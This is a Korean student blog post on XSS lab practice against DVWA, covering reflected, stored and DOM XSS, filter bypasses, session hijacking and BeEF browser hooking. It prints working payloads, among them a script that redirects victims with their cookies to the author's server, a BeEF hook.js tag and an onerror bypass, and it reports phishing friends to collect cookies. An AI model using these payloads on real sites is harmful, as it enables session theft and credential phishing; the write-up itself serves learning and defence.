---
title: "XSS 공격 실습"
author: 김규형
date: 2023-09-30 14:43:00 +0800
categories: [Study, Network-Security]
tags: [Network-Security]
render_with_liquid: true
comments: true
---
> **XSS(Cross-Site Scripting)은 SQL Injection과 함께 웹 보안에 있어 가장 기초적인 공격 방법의 일종으로 사이트에 스크립트를 삽입하는 기법**
> 

# **목차**

1. **공격 원리**
2. **실습 준비**
3. **실습 내용**
    
    **3-1. Reflected XSS**
    
    **3-2. Stored XSS**
    
    **3-3. DOM XSS**
    
    **3-4. Reflected XSS(Medium, High Level)**
    
    **3-5. Session Hijacking**
    
    **3-6. BeEF**
    
4. **고찰**
    
    **4-1. SQL Injection 과 XSS의 관계**
    
    **4-2. 쿠키에 대해서 더 알아보기**
    
    **4-3. 쿠키와 HttpOnly**
    
    **4-4. 쿠키와 PHPSESSID**
    
    **참고 자료**
    

---

## 원리

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled.png)

- 웹 어플리케이션이 사용자로부터 입력 값을 제대로 검사하지 않음
- 사이트에 접속한 사용자에게 특정 코드가 실행되게 함
- 민감한 정보(쿠키, 세션) 을 탈취
- 공격 방법에 따라 Stored XSS와 Reflected XSS로 나뉨
    - **Stored XSS**는 사이트 게시판이나 댓글, 닉네임 등 스크립트가 서버에 저장되어 실행되는 방식
    - **Reflected XSS**는 보통 URL 파라미터(특히 GET 방식)에 스크립트를 넣어 서버에 저장하지 않고 그 즉시 스크립트를 만드는 방식
- 자바스크립트를 사용하여 공격하는 경우가 많다

---

# 실습

### 실습 환경

실습한 공격 기술: **XSS**

*실습 환경: Kali Linux, Window 10, Apache, MySQL, PHP, DVWA, BeEF*

### 실습 목적

- 실습에 있어 다양한 XSS 공격을 실습하고 분석하여 자동 방식을 공부한다. 
- BeEF와 같은 도구를 활용하여 실제 효과와 가능성을 생각해본다.
- 최종적으로 실습을 통해 얻은 결과와 지식으로 XSS 공격의 적절한 대응 방법을 생각해보고 추후 프로젝트에 있어 웹 어플리케이션의 보안 수준을 향상 시키는 것을 목표로 한다.

## Reflected XSS

Reflected XSS 공격은 비 지속적 공격으로, 웹 애플리케이션 사용자가 스크립트 코드가 삽입된 요청을 전송하도록 만들어 사용자 브라우저에서 스크립트 코드를 실행하도록 하는 공격이다. 보통 피싱 메일 등을 이용해 스크립트 코드가 포함된 페이지로 사용자를 유도한다.

### DVWA 설치

> **DVWA** 란?
> 

DVWA는 "Damn Vulnerable Web Application"의 약자로, 웹 애플리케이션 보안을 학습하고 테스트하기 위한 오픈 소스 웹 어플리케이션이다.

 이 어플리케이션은 고의적으로 다양한 보안 취약점을 갖고 있어, 보안 전문가나 개발자들이 웹 애플리케이션 보안에 대한 이해를 향상시키기 위해 주로 사용된다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%201.png)

### XSS 취약점 파악

`<script> alert(1) </script>` 를 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%202.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%203.png)

alert(1) 명령어를 사용해 입력 창에 삽입한 스크립트가 작동하는지 확인.

본 사이트는 XSS 공격에 취약함을 알 수 있었다.

### 쿠키 출력 *(실패)*

`<script> alert(document.cookie) </script>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%204.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%205.png)

현재 세션의 쿠키 정보를 얻기 위해 alert(document.cookie) 명령어를 사용

알림 창에 쿠키 정보가 출력되는 것을 예상했지만 출력되지 않았다.

### 쿠키 출력 *(성공)*

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%206.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%207.png)

*firefox*의 확장 프로그램인 *cookie-editor*를 이용해 `Http Only` 옵션을 해제하고 난 후 재시도하니 쿠키가 출력되었다. 

`Cookie`와 `Http Only`에 대해서는 *4. 고찰*에서 자세히 다루었다.

### Fake site로 이동, Cookie 탈취

`<script>document.location='[http://<자체 서버 ip>/test.php/'+document.cookie](http://183.109.161.55:9876/test.php/'+document.cookie)</script>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%208.png)

특정 url로 접속하면 쿠키 정보를 공격자에게 넘겨주도록 하는 스크립트이다. 

이 단계에서는 구축한 서버를 이용하여 페이크 사이트를 만들어 해당 스크립트를 실행할 경우 페이크 사이트로 자동 redirect되며 쿠키가 저장되게 하는 공격이다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%209.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2010.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2011.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2012.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2013.png)

*vmware*을 활용해 다수의 환경에서 fake site를 통해 접속하였다.

위 스크립트를 입력창에 삽입하면 미리 만들어 놓은 페이지로 리다이렉트되는 동시에 쿠키 정보가 서버 로그에 남게 된다. 

아래는 서버 로그에 기록된 쿠키 정보들이다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2014.png)

이를 통해 미리 삽입된 코드로 접속한 모든 사람들의 쿠키가 이론적으로 가능함을 볼 수 있었다.

### 메일 피싱

위의 스크립트에 직접적으로 스크립트로 넣어서 쿠키를 탈취하는 방식은 실제 공격에서는 응용이 어렵다고 판단하였다. 

그렇기에 메일을 이용해 스크립트를 미리 삽입한 상태로 피싱 메일을 보내 쿠키를 탈취하는 상황을 가정해 실습해 보았다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2015.png)

실습을 위해 무료 아이폰 당첨이라는 매력적인 피싱 메일을 준비하였다.

**수신자가 받은 피싱 메일**

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2016.png)

해당 링크를 클릭하는 순간 attacker가 만들어논 사이트로 redirect 된다.

**메일 피싱 쿠키 수집로그**

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2017.png)

해당 메일을 여러 친구들에게 보내 쿠키를 수집하는데 성공했다.

> 이 공격은 실제 피싱메일이 어떤 방식으로 돌아가는줄 알게 해주는데 좋은 경험이 되었다.
> 

## Stored XSS

Stored XSS는 Reflected XSS와는 달리 지속적인 공격을 수행한다. 

스크립트 코드가 서버에 저장되어 있다. 사용자들이 요청할 때마다 저장된 스크립트가 사용자에게 응답하여 스크립트가 실행되는 공격이다. 

예를 들어, 게시판 페이지에서 스크립트 코드가 포함된 게시글을 작성하면 해당 게시글을 열람할 때마다 스크립트가 실행된다.

### Basic Stored XSS

게시판에 스크립트를 삽입한다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2018.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2019.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2020.png)

이 이후로 Stored XSS 탭에 접속할 때마다 스크립트 코드가 실행되어 지정한 url로 redirect되며 공격자 호스트로 쿠키가 전달되는 것을 확인할 수 있다.

### 실제 상황을 가정한 Stored XSS

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2021.png)

다시한번 자체 서버를 사용하여 해당 페이지에 악성 스크립트를 삽입하여 페이크 사이트로 이동을 설정한다.

이와 같은 방식은 메일 피싱과 마찬가지로 게시판을 누름과 동시에 페이크 사이트로 이동시키고 쿠키 목록은 위와 같이 저장될 수 있다.

**게시판에 들어가자마자 attacker 사이트로  redirect 된 모습**

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2022.png)

### DOM XSS

> DOM이란?
> 

HTML의 요소들을 프로그램에서 제어할 수 있도록 만든 API로 자바스크립트에서 DOM을 활용해서 동적으로 요소에 접근하거나 수정, 삭제, 추가 등의 동작을 할 수 있다. 

DOM XSS는 DOM을 이용해서 요소들을 수정할 때 발생하며, 악성 URL을 이용하여 서버에는 영향을 끼치지 않고 브라우저에서 스크립트를 실행시키는 공격이다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2023.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2024.png)

URI의 DEFAULT 뒷부분을 수정하여 없던 항목을 만든 모습이다. 

서버와 상관없이 스크립트만으로 작동이 가능하다

이를 이용하여 URI에 자바스크립트 명령어를 삽입하여 쿠키를 출력하도록 진행해 보았다.

*`<script>alert(document.cookie)</script>`* 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2025.png)

*`<script>document.write("XSS")</script>`* 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2026.png)

URI에서 Default 파라미터에 <script>document.write(“XSS”)</script>를 삽입하여 전달했다. 

이렇게 하면 URI에 default 파라미터에 Korean을 넣어서 조작을 한 것 처럼 XSS로 바뀌어 있는것을 확인할 수 있다.

 취약한 인자에 XSS를 통해 DOM 조작에 성공한 것을 알 수 있다. HTML 코드를 보면, 스크립트가 정상적으로 삽입된 것을 확인할 수 있었다.

## Reflected XSS(Medium, High Level)

위의 공격들은 DVWA에서 security level을 Low Level로 설정하고 진행해보았다. 

이번에는 Medium, High, Impossible level에서 위와 같은 Reflected XSS 공격을 시도해 본다.

### Medium Level에서의 Reflected XSS

*`<script>alert(1)</script>`* 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2027.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2028.png)

Medium Level에서는 alert(1) 부분의 문자열만 출력되는 것을 확인할 수 있다.

**방어 원리**

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2029.png)

이러한 현상이 나타나는 이유는 Medium Level의 php 소스코드에서 확인할 수 있다. 

`$name = str_replace(‘<script>’, ‘ ‘, $_GET[ ‘name’ ])` 는 `str_replace` 함수를 이용해 `<script>`부분을 필터링하여 XSS 공격이 동작하지 않도록 만든다. 

그러나 `str_replace` 함수의 단점은 문자의 소문자만을 필터링한다는 문제점이 있다.

**우회 공격**

`<SCRIPT>alert(1)</SCRIPT>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2030.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2031.png)

위에서 설명한 코드의 허점을 이용해 script 태그를 대문자로 수정하는 방식으로 우회하여 XSS 공격을 시도하였고 성공한 모습이다.

### High Level에서 Reflected XSS

`<script>alert(1)</script>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2032.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2033.png)

Medium Level과 다르게 ‘`>`’ 부분만 출력되는 모습을 볼 수 있다.

**대문자로 우회시도**

`<SCRIPT>alert(1)</SCRIPT>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2034.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2035.png)

효과가 없는 것 같다…

**방어 원리**

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2036.png)

그 이유는, 위 php소스코드의

`$name = preg_replace( ‘/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t(.*)/i, ‘ ‘, $_GET[ ‘name’ ] )`

에서 `preg_replace` 함수 때문이다. `preg_replace` 함수는 정규식을 사용해 대소문자를 구분하고, 각 문자마다 `<script>`에 해당하는 문자까지 필터링해 우회를 할 수 없도록 만들었다. 

이러한 방법은 대소문자를 구분하고, `<script>`에 해당하는 문자를 필터링하여 XSS를 시도를 막고, 스크립트 코드를 작성할 수 없게 만들지만, 스크립트 코드가 아닌 HTML 태그를 이용하면 우회가 가능하다.

**우회 시도**

`<script>` 태그 대신 html의 `<img>` 태그를 이용해 스크립트 태그가 아닌 것처럼 위조하여 삽입해 보았다.

`<img src=x onerror=alert(1)>`  삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2037.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2038.png)

공격에 성공한 모습이다. 삽입한 태그를 스크립트 태그로 인식하지 못한 것으로 추측할  수 있다.

### **Impossible Level에서의 Reflected XSS**

이번에는 Security Level을 최대인 Impossible로 설정하고, HTML 태그를 이용하여 XSS를 시도해본다.

High Level에서 사용했던 우회방법을 사용해 보았다.

`<img src=x onerror=alert(1)>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2039.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2040.png)

그러나 이번에는 `<img src=x onerror=alert(1)>` 이 입력한 그대로 출력되는 모습을 확인할 수 있다.

**원리**

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2041.png)

그 이유는 HTML 코드에서 확인할 수 있다. 

**GET**의 `name`변수 입력값이 출력된 `<pre Hello &lt; img src=x onerror=alert(1)&gt;</pre>`의 부분을 보면, 특수문자인 부등호가 `&lt;`와 `&gt;`로 바뀌어 있는 모습을 볼 수 있다. 

이는 일부 특수문자인 부등호(`< >`), 큰따옴표(`“ ”`), 작은따옴표(`‘ ‘`), `&`등을 **HTML entity**로 변환하여 **HTML 구문 삽입을 차단**하기 때문이다. 추가로, ‘`<`’는 ‘`&lt`;’로,  ‘`>`’는 ‘`&gt`;’로, ‘ `“` ‘는 ‘`&quot;`’로, ‘`&`’는 ‘`&amp;`’로 각각 **특수문자에서 HTML entity**로 변경된다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2042.png)

또 다른 이유는 php 소스코드에서도 확인할 수 있는데, `$name = htmlspecialchars( $_GET[ ‘name’ ] );` 에서 `htmlspecialchars()` 함수를 이용한 것을 볼 수 있다. 이것도 HTML 소스와 마찬가지로, **일부 특수문자를 HTML entity로 변경**하는 기능을 한다. 특수문자가 HTML entity로 변경 되었을 경우, 웹페이지에서는 문자가 출력되지만 특별한 기능은 수행하지 않기 때문이다.

따라서 일반적으로 XSS 공격으로는 Impossible Level은 일반적인 XSS공격에 대해 매우 훌륭한 보안대책을 가지고 있다는 점을 알 수 있었다. 그렇기에 현재 우리의 수준으로는 공격 가능성이 없다고 생각하였다.

기술적으로 불가능하다면 **사람(=*관리자*)를 속여 진행되는 흔히 말하는 사회공학적 해킹 방식**이 가능해 보인다.

예를 들어, `<iframe>`태그를 사용해 문서 안에 문서를 삽입하여 사용자를 속이는 방식이 대표적이다.

`<iframe>`으로 daum 사이트를 불러왔다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2043.png)

이번 실습에서는 daum 사이트이지만 정교하게 조작된 가짜 로그인 창을 사용해 관리자에게서 중요한 정보를 입력받는 방식을 기대해 볼 수 있다.

## Session Hijacking

앞서 다양한 방법과 다양한 보안 상태 일때 쿠키 값을 탈취해보는 실습을 진행해보았다. 

그렇다면 이러한 방식으로 해커가 쿠키를 탈취한다면 어떤 공격이 가능할까?

 대표적인 공격으로 저번 실습에서 진행한 **Session Hijacking**이 있다. 

MITM 도구를 사용하며 탈취한 쿠키를 이용해 웹 서버에서 Admin 세션을 탈취해보겠다.

### Web Application DB 테이블 구성

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2044.png)

4명의 아이디와 admin 정보가 담긴 *users* 테이블이다. 

 admin의 `username`과 `password`를 모른채 admin 세션을 탈취하는 것을 목표로한다.

**서버 구성**

- *`login_process.php`* : 로그인 form을 생성해서 입력 값을 `check_login.php`로
- *`check_login.php`*:  DB 에서 사용자 정보 조회 후 `ndex1.php`로
- *`ndex1.php`* : PHP의 세션을 사용하여 로그인한 사용자의 정보를 가져오고 결과 값을 띄운다.

이번 웹이 기존의 서버와 다른 점은 `ndex1.php`에 있다.

```php
<?php
$username = $_SESSION["user"];
?>
```

`$_SESSION`는 PHP에서 제공하는 슈퍼 글로벌 변수로 사용자에게 할당된 고유한 세션 ID를 user키 값을 통해 연결된 데이터를 저장한다.

즉, 사용자가 세션을 연결 할 때마다 서버 측에 세션 데이터를 저장하는 방식을 사용한다.

### paros 설치

> paros란?
> 

paros는 네트워크 트래픽을 가로채는 MITM 도구 중 하나이다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2045.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2046.png)

### 로그인 테스트

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2047.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2048.png)

**김규형** 계정으로 잘 로그인 된 것을 확인 할 수 있었다.

### 요청 조작

**paros**를 활용해 요청을 가로채고 Trap서버로 redirect 한다.

이를 통해 해당 서버와 클라이언트간의 요청을 분석하고 조작이 가능하다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2049.png)

### 세션 아이디 변경

WireShark를 통한 스니핑을 통해 PHPSESSID를 알아낸다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2050.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2051.png)

기존의 `PHPSESSID`를 지우고 `PHPSESSID=pa0b69mh1dqvdt5fg4hlachook`로 조작한다.

### 어드민 세션 획득

**paros**에서 가로챈 요청을 continue를 눌러 서버로 전달되고 서버는 위조된 `PHPSESSID`를 받아 admin으로 생각해 admin 세션 페이지를 응답한다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2052.png)

### 방지 방법

*SSL*을 활용한 *HTTPS*를 통해 암호화된 세션 연결을 사용하는 방식이 있을 수 있다.

`httponly` 플래그를 사용할 순 있는데 이러한 `httponly`는 *4.고찰*에서 설명하겠다.

또한 중요한 사이트를 로그인 하지 않은 유저들이 접속 할 수 없게 하는 것도 방지법이 될 수 있다. 대표적으로 `fillter` 를 적용하는 것도 좋은 방식이라고 생각한다. 

애초에 조작을 할 수 있는 세션과 연결할 기회를 주지 않은 방법이다.

코드 적으로는 세션 데이터의 무결성을 확인하는 기능을 추가 할 수 있다. 조작된 세션이라고 의심될 경우 세션을 파기하는 방식이다.

아래는 보안을 위해서 추가할 수 있는 세션 검증 `validateSession()` 함수이다.

```php
function validateSession() {
      	  $sessionID = session_id();
 	  $storedSession = getSessionFromDatabase($sessionID);

 	   if ($storedSession && $storedSession["user"] === $_SESSION["user"]) {
     		   return true;
  	  } else {
     	   session_destroy();
                  header("Location: login_process.php");
    	    exit();
  	  }
}
```

이러한 방식이 시도되기 전에 쿠키 값을 비롯한 세션 정보가 XSS 공격으로 탈취되지 않는 것이 가장 좋은 방식이라고 생각한다.

## BeEF

*BeEF*는 브라우저 취약점에 초점을 맞춘 테스트 도구로, 클라이언트 측 공격 벡터를 사용하여 대상 환경의 보안 강도를 평가하는 용도로 사용한다. 

이번 실습에서는 *BeEF*를 사용하여 하나의 웹 브라우저에 대해 xss 공격을 진행해 보았다. attacker는 kali-linux, victim은 window로 실습 환경을 구성했다.

### BeEF 설치 및 환경 구성

kali-linux에서 BeEF를 설치 및 실행한 모습이다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2053.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2054.png)

victim이 접속할 attacker 서버의 페이지를 구성한다.

초기 화면을 구성하는 `index.html` 파일에 script 태그를 삽입했다. victim이 이 페이지에 접속하면 삽입해 놓은 스크립트가 실행되어, victim을 후킹하는 방식이다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2055.png)

`<script src=”http://<attacker’s ip>:3000/hook.js”></script>` 삽입

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2056.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2057.png)

victim에서 attacker 서버 페이지를 접속한 후 윈도우의 개발자 모드 화면과, *BeEF* 화면이다. 

Hooked Browsers에 victim의 ip가 생성됨을 통해 script가 실행되어 victim이 후킹되었음을 확인할 수 있다.

### alert dialog 생성하기

Commands 탭에서 여러 가지 공격을 시도할 수 있다. 

기본적인 alert dialog 공격부터 시도해 본다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2058.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2059.png)

alert text를 설정한 후 공격하여, victim에서 해당 alert가 생성된 모습이다.

### 데이터 탈취

다음으로는 Google Phishing 공격을 진행해 본다. 

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2060.png)

접속한 attacker 서버 페이지를 구글 로그인 페이지로 위조하여, 사용자가 로그인을 하면 해당 로그인 정보를 *BeEF*에서 확인할 수 있다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2061.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2062.png)

페이지 화면은 구글 로그인 화면으로 바뀌었지만 url은 attacker 페이지 url로 동일하다. 

Login 정보를 입력하면 *BeEF*에 해당 정보가 기록된 것을 확인할 수 있다.

### 다른 페이지로 redirect 시키기

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2063.png)

attacker 서버 페이지에서 다른 url로 임의로 리다이렉트 시킨다. Redirect url은 [*http://google.com*](http://google.com/) 으로 지정했다.

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2064.png)

![Untitled]({{ site.baseurl }}{{ page.url }}/XSS%20(Cross-site%20Scripting)%20bfb6c6c6ce0a45b6957a8a1961ada7ce/Untitled%2065.png)

*BeEF*에서 실행 후 victim을 보면 접속해 있던 attacker 서버 페이지가 google 사이트로 리다이렉트 되는 것을 확인할 수 있다. 

또한 *BeEF*에서 online browsers에 있던 victim이 offline browsers로 이동하는 것을 확인할 수 있는데, 이는 attacker 서버 페이지에서 벗어났기 때문이다.

---

## 실습에 대한 고찰

### **SQL Injection 과 XSS의 관계**

이번 XSS 실습을 하면서 SQL Injection과 매우 비슷한 방식임을 느끼고 두 공격에 대한 공통점과 차이점에 대해 생각해보는 시간을 가졌다. 

두 방식 모두 웹 환경에서 실행될 수 있는 공격이며, 웹과 DB 사이에서 상호작용을 할 때 입력값에 무언가를 Injection하여 공격을 시도하는 방식이다. 

그렇기 때문에 방지하는 방법 또한 입력값 검증과 이스케이프 등으로 유사하다.

차이점으로는 SQL Injection은 주로 DB를 공격대상으로 하여 DB의 실행 쿼리문 등을 함께 비교해야 했던 점에 비해 XSS는 주로 사용자의 브라우저에 대한 공격이였다. 

이러한 점은 두 공격의 심각성에 대해 종류를 나누게 되었다.

***SQL Injection***은 DB에 DROP문 이나 DELETE 문등을 활용하여 DB 자체를 망가트려 서비스 이용능력에 치명적인 영향을 주기 때문에 위험성이 크다고 생각한 반면, XSS는 웹 페이지를 방문한 모두에게 악성 스크립트가 실행되기 때문에 무차별적으로 다수의 피해자가 발생될 수 있는 위험성이 있다고 생각한다.

### **쿠키에 대해서 더 알아보기**

**쿠**키는 웹 브라우저와 웹 서버간의 상태 정보를 유지하기 위해 사용되는 데이터이다. 이름, 값, 도메인, 경로 등 다양한 정보를 가지고 있기 때문에 어떠한 경로로던 유출된다면 정보 노출, 세션 위조 등 다양한 보안 취약점을 가지고 있기도 하다. 만약 쿠키가 탈취된다면 세션 하이재킹 뿐만 아니라 사용자의 권한 조작, 민감한 개인정보 유출 등의 피해를 입을 수 있다.

쿠키는 민감한 정보이기 때문에 외국 사이트를 들어가다 보면 쿠키에 대한 기능으로 분류하여 각 기능에 맞는 쿠키 활용 동의를 묻는 창을 본 적이 있다. 하지만 한국 웹 사이트에서는 쿠키에 대한 정보를 묻는 창을 본 적이 없다. 그렇다면 한국 사이트에 대한 쿠키 정책은 어떨지 궁금증이 생겨 알아보았다.

한국은 개인정보 보호법에 대해서 쿠키를 관리한다고 한다.

> *7. 인터넷 접속정보파일 등 개인정보를 자동으로 수집하는 장치의 설치, 운영 및 그 거부에 관한 사항(해당하는 경우에만 정한다.*
> 
> 
